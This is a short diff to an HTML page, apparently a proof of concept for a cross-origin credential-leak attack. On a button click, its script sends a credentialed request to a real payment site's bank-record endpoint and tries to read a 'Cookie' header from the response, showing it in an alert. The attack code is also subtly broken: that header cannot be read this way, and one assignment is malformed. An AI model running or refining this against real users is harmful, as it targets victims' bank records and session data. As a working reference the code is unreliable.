@@ -2,20 +2,25 @@
 <html>
 <body>
 <div id="demo">
-<h1> get data </h1>
+<h1> get balence </h1>
 <button type="button" onclick="loadDoc()">click me</button>
+
 </div>
 <script>
+  var p;
 function loadDoc() {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
       document.getElementById("demo").innerHTML =
-      this.responseText;
+      p=this.getResponseHeader('Cookie');
+      alert(p);
+      
     }
   };
-  
-  xhttp.open("GET","https://my.58.com/persondata",true)
+  //
+  xhttp.withCredentials=true;
+  xhttp.open("GET","https://paycenter.58.com/bloc/showbankrecord",true);
   xhttp.send();
 }
 </script>
